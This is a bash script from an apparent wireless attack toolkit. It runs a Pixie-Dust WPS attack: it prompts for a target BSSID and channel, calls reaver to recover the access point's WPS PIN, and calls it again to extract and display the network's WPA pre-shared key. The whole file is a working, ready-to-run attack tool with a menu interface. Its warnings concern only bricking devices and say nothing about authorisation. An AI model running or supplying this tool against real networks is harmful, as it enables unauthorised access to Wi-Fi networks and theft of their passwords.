#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root

# Main menu prompt
prompt_to_continue() {
    local options=("Start Pixie dust attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}              Pixie dust attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} Repeated PIN probing may lock out WPS or brick some devices."
    echo -e "${RED}[!]${NC} Make sure you’ve enabled a monitor interface using ${BOLD}iw dev${NC}."

    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  
            0) go_back ;;  
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

pixie_dust_attack() {
    clear
    echo -e "${GREEN}[*]${NC} Enter details for the Pixie-Dust attack:"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} BSSID (XX:XX:XX:XX:XX:XX): ")" bssid
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid MAC address."
            sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    # Ask for channel
    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Target AP channel (1–14): ")" channel
        [[ "$channel" =~ ^[0-9]+$ ]] && (( channel>=1 && channel<=14 )) && break
        echo -e "${RED}[!]${NC} Invalid channel." && sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} Channel set: $channel"

    read -rp "$(echo -e "${GREEN}[*]${NC} Press Enter to start attack.") "
    
    echo -e "${GREEN}[*]${NC} Running Pixie-Dust (timeout 5 minutes)…"
    OUTPUT=$(timeout 300s sudo reaver -K 1 -vvv -b "$bssid" -c "$channel" -i "$MONITOR_INTERFACE")
    parse_results "$OUTPUT"
}

# --- Parse initial Pixie-Dust output, extract PIN, then call crack_with_pin() ---

# --- Run Reaver again with the discovered PIN to pull the WPA PSK ---
crack_with_pin() {
    local pin="$1"
    echo -e "${GREEN}[*]${NC} Re-running Reaver with PIN ${BOLD}$pin${NC} to recover WPA PSK…"
    local out
    out=$(sudo reaver -i "$MONITOR_INTERFACE" -b "$bssid" -c "$channel" -p "$pin" 2>&1)

    if echo "$out" | grep -q "WPA PSK:"; then
        local PIN=$(echo "$out" | awk '/WPS PIN:/ {print $NF}')
        local PSK=$(echo "$out" | awk '/WPA PSK:/ {print $NF}')
        local SSID=$(echo "$out" | awk -F'SSID: ' '/AP SSID:/ {print $2}')
        echo
        echo -e "${GREEN}[*]${NC} Results: "
        echo -e "  ${GREEN}[✓]${NC} PIN: $PIN"
        echo -e "  ${GREEN}[✓]${NC} PSK: $PSK"
        echo -e "  ${GREEN}[✓]${NC} AP SSID: $SSID"
        echo 
    else
        echo -e "${RED}[!]${NC} Failed to recover WPA PSK with PIN $pin."
    fi
}

parse_results() {
    local output="$1"

    if echo "$output" | grep -qi "WPS pin:"; then
        local pin
        pin=$(echo "$output" | awk '/[Ww][Pp][Ss] pin:/ {print $NF}')
        echo -e "${GREEN}[✓]${NC} Discovered WPS PIN: ${BOLD}$pin${NC}"
        crack_with_pin "$pin"
    else
        echo -e "${RED}[!]${NC} Failed to find a WPS PIN in Reaver output."
    fi

    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5

}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo -e "${GREEN}[*]${NC} Choose next operation:"
    echo
    echo -e "  ${GREEN}[1]${NC} New Pixie dust attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Select an option: ")" opt
        case $opt in
            1) clear; pixie_dust_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice wps
    pixie_dust_attack
    after_attack_options
}

main
